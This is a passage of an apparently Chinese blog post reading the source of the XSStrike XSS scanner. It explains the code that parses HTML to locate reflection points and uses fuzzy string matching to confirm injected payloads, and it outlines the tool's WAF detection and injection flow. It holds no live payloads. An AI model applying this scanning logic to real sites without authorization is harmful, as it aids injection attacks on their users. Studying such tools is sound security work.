<h2 id="html-parse-html解析"><a href="#html-parse-html解析" class="headerlink" title="html_parse() - html解析"></a>html_parse() - html解析</h2><p>html_parse()定义在第 287 行：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">html_parse</span><span class="params">(init_resp)</span>:</span></div><div class="line">    parser = MyHTMLParser() <span class="comment"># initializes the parser</span></div><div class="line">    location = <span class="string">''</span> <span class="comment"># Variable for containing the location lol</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        parser.feed(init_resp) <span class="comment"># submitting the response to the parser</span></div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e: <span class="comment"># Catching the exception/error</span></div><div class="line">        location = str(e) <span class="comment"># The error is actually the location. For more info, check MyHTMLParser class</span></div><div class="line">    <span class="keyword">return</span> location <span class="comment"># Returns the location</span></div></pre></td></tr></table></figure></p>
<p>而<code>MyHTMLParser()</code>是作者实现的类，继承自HTMLParser，定义在第 360 行：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHTMLParser</span><span class="params">(HTMLParser)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_comment</span><span class="params">(self, data)</span>:</span></div><div class="line">        <span class="keyword">global</span> OCCURENCE_PARSED</div><div class="line">        <span class="keyword">if</span>(xsschecker.lower() <span class="keyword">in</span> data.lower()):</div><div class="line">            OCCURENCE_PARSED += <span class="number">1</span></div><div class="line">            <span class="keyword">if</span>(OCCURENCE_PARSED == OCCURENCE_NUM):</div><div class="line">                <span class="keyword">raise</span> Exception(<span class="string">"comment"</span>)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_startendtag</span><span class="params">(self, tag, attrs)</span>:</span></div><div class="line">        ...</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_starttag</span><span class="params">(self, tag, attrs)</span>:</span></div><div class="line">        ...</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_endtag</span><span class="params">(self, tag)</span>:</span>       </div><div class="line">        ...</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_data</span><span class="params">(self, data)</span>:</span></div><div class="line">        ...</div></pre></td></tr></table></figure></p>
<p>以<code>handle_comment</code>为例，当当前处理的OCCURENCE_PARSED与OCCURENCE_NUM相等时，说明此时MyHTMLParser()解析到此时检查的输出点处，根据情况不同raise异常，比如<code>raise Exception(&quot;comment&quot;)</code>。</p>
<p>然后<code>html_parse()</code>中，通过捕获异常<code>location = str(e)</code>来获得输出点的位置。</p>
<p>在html解析中，输出点主要分为以下几类：</p>
<ul>
<li>comment</li>
<li>script</li>
<li>attr</li>
<li>html_data</li>
<li>start_end_tag_attr </li>
</ul>
<h2 id="test-param-check-检查返回值"><a href="#test-param-check-检查返回值" class="headerlink" title="test_param_check() - 检查返回值"></a>test_param_check() - 检查返回值</h2><p>test_param_check()定义在 296 行，用于在注入特殊字符串（包括比如引号测试，payload测试）后，根据页面返回信息来确定是否xss成功。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_param_check</span><span class="params">(payload_to_check, payload_to_compare, OCCURENCE_NUM, url, param_data, GET, POST, action)</span>:</span></div><div class="line">    check_string = <span class="string">'XSSSTART'</span> + payload_to_check + <span class="string">'XSSEND'</span> <span class="comment"># We are adding XSSSTART and XSSEND to make</span></div><div class="line">    compare_string = <span class="string">'XSSSTART'</span> + payload_to_compare + <span class="string">'XSSEND'</span> <span class="comment"># the payload distinguishable in the response</span></div><div class="line">    param_data_injected = param_data.replace(xsschecker, check_string)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        check_response = make_request(url, param_data_injected, GET, POST)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        check_response = <span class="string">''</span></div><div class="line">    success = <span class="keyword">False</span></div><div class="line">    occurence_counter = <span class="number">0</span> <span class="comment"># Variable to keep track of which reflection is going through the loop</span></div><div class="line">    <span class="comment"># Itretating over the reflections</span></div><div class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">'XSSSTART'</span>, check_response, re.IGNORECASE):</div><div class="line">        occurence_counter = occurence_counter + <span class="number">1</span></div><div class="line">        efficiency = fuzz.partial_ratio(check_response[m.start():m.start()+len(compare_string)].lower(), compare_string.lower())</div><div class="line">        <span class="keyword">if</span> efficiency == <span class="number">100</span>:</div><div class="line">            <span class="keyword">if</span> action == <span class="string">'do'</span>:</div><div class="line">                ...</div><div class="line">            <span class="keyword">if</span> occurence_counter == OCCURENCE_NUM:</div><div class="line">                success = <span class="keyword">True</span></div><div class="line">            <span class="keyword">break</span></div><div class="line">        </div><div class="line">        <span class="keyword">if</span> efficiency &gt; <span class="number">90</span>:</div><div class="line">            <span class="keyword">if</span> action == <span class="string">'do'</span>:</div><div class="line">                ...</div><div class="line">    <span class="keyword">return</span> success</div></pre></td></tr></table></figure>
<p>check_string是发送的payload，由于要在网络中传输，因此一般会经过url编码。compare_string是页面返回html中期望看到的payload本身。这两个变量头尾都加上了<code>XSSSTART</code>和<code>XSSEND</code>，这是为了后续定位检测的方便。</p>
<p>在定位到输出点后，使用了<code>fuzz.partial_ratio()</code>来计算字符串的相似度，来测试xss是否成功过。</p>
<p>根据官网的信息，里面是这么描述XSStrike的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">But is XSS about copy pasting payloads? No. That&apos;s why XSStrike uses context breaking technique to automatically generate payloads and then uses levensthian algorithm to look for the payload in the web page to avoid false positives/negatives.</div></pre></td></tr></table></figure></p>
<p>所以<code>levensthian algorithm</code>即为<code>partial_ratio()</code>。。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>XSStrike的运行流程归结如下：</p>
<ol>
<li>程序初始化</li>
<li>input() 程序入口<ol>
<li>param_parser() 参数解析</li>
<li>initiator() xss扫描<ol>
<li>paramfinder() 查询隐藏参数</li>
<li>GET/POST<ol>
<li>WAF_detector() WAF检测</li>
<li>有无WAF<ol>
<li>有<ol>
<li>fuzzer()</li>
</ol>
</li>
<li>无 <ol>
<li>filter_checker()</li>
<li>locater()<ol>
<li>scan_occurence()</li>
</ol>
</li>
<li>inject()<ol>
<li>test_param_check() 特殊字符检测</li>
<li>test_param_check() payload注入检测1</li>
</ol>
</li>
<li>手动检测</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XSStrike 源码阅读&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="源码阅读" scheme="http://chybeta.github.io/tags/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    
      <category term="xss" scheme="http://chybeta.github.io/tags/xss/"/>
    
      <category term="扫描器" scheme="http://chybeta.github.io/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    
      <category term="安全开发" scheme="http://chybeta.github.io/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
</feed>
